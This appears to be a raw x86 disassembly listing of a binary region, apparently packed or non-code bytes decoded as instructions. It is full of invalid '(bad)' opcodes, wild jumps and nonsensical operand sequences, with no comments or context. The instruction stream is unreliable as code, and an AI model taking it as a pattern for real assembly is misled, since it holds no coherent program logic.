  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
